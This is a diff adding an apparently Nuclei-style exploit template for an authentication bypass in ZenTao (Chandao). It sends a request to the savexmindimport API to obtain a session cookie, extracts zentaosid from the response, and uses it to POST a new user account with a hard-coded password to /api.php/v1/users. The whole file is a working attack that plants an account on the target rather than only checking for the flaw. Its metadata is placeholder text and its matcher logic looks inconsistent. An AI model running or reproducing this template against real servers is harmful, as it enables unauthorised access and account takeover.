@@ -1,0 +1,44 @@
+id: QVD-2024-15263
+
+info:
+  name: Oa-Chandao-AuthBypass
+  author: xxx
+  severity: info
+  description: description
+  reference:
+    - https://
+variables:
+  username: "{{to_lower(rand_base(3))}}"
+  metadata:
+    Hunter-query: xxx
+  tags: chandao
+
+http:
+  - raw:
+      - |
+        GET /zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=dddidkyodsnfamzvjidb&branch=klmnehgxnsmeuhshbooy HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /zentao/api.php/v1/users HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{plt}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+        Connection: close
+        Content-Type: application/json
+        
+        {"account":"{{username}}","password":"Qwe123","realname":"{{username}}","role":"","group":"2"}
+
+    extractors:
+      - type: regex
+        part: header
+        name: plt
+        internal: true
+        regex: 
+          - 'zentaosid(.*?);'
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(header_2,"zentao") && status_code==403
